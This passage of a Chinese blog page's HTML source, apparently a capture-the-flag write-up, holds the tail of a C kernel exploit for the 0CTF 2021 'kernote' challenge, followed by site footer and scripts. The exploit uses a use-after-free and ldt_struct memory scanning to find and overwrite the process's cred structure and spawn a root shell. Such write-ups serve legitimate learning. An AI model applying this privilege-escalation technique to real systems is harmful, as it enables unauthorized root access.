class="built_in">stdout</span>,_IONBF,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ttyfd = open(<span class="string">"/dev/ptmx"</span>,O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((dev_fd = open(<span class="string">"/dev/kernote"</span>,O_RDWR))&lt;<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        err_exit(<span class="string">"open device"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"Starting brute dma base"</span>);</span><br><span class="line">    page_offset_base = ldt_guessing_direct_mapping_area(create_uaf,<span class="number">0</span>,editNote,<span class="number">0</span>,<span class="number">0x4000000</span>);</span><br><span class="line">    HEX(page_offset_base);</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"Starting to Search struct cred1"</span>);</span><br><span class="line">    pthread_setname_np(pthread_self(),<span class="string">"HanQi.."</span>);</span><br><span class="line">    serach_config sc = {.bufferSize=<span class="number">0x8000</span>,.searchString=<span class="string">"HanQi.."</span>,.searchStringsize=<span class="number">8</span>,.debug=<span class="number">0</span>,.constraint=is_cred_comm};</span><br><span class="line">    ldt_seeking_memory(editNote,<span class="number">0</span>,page_offset_base,memsearch,&amp;sc);</span><br><span class="line">    cred_addr = sc.Addtional;</span><br><span class="line">    HEX(cred_addr);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">    desc.base_addr = <span class="number">0</span>;</span><br><span class="line">    desc.entry_number = <span class="number">2</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    LOG(<span class="string">"Try to modify cred"</span>);</span><br><span class="line">    <span class="type">pthread_t</span> modify_thr;</span><br><span class="line"></span><br><span class="line">    editNote(<span class="number">0</span>,cred_addr+<span class="number">4</span>);</span><br><span class="line">    <span class="type">int</span> retval=fork();</span><br><span class="line">    <span class="keyword">if</span>(!retval)</span><br><span class="line">    {</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span>(!retval)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">//child child</span></span><br><span class="line">            bind_core(<span class="number">0</span>);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">15</span>;++i)</span><br><span class="line">                addNote(i);</span><br><span class="line">            chooseNote(<span class="number">11</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">15</span>;++i)</span><br><span class="line">                delNote(i);</span><br><span class="line">            bind_core(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">                editNote(<span class="number">0</span>,cred_addr+<span class="number">4</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="comment">//child</span></span><br><span class="line">            bind_core(<span class="number">0</span>);</span><br><span class="line">            sleep(<span class="number">3</span>);</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">            sleep(<span class="number">200</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,geteuid());</span><br><span class="line">        setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        get_root_shell();</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312281602695.png"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://jamorant12138.github.io/2023/ldt_struct-arb_rw%20&&%200CTF2021-kernote/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2024/Linux%20Kernel%20Exploit%20Basic--Notes/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Linux Kernel Exploit 入门笔记
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/CSCD70-Assignment2/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">CSCD70 Assignment2 DataFlow</div>
+      </a>
+    
+  </nav>
+
+  
+   
+    
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022-2024
+        <i class="ri-heart-fill heart_icon"></i> 翰青HanQi
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="北极落小雪"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/2022/About">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+ 
+<script src="/js/clickLove.js"></script>
+ 
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+
+</html>
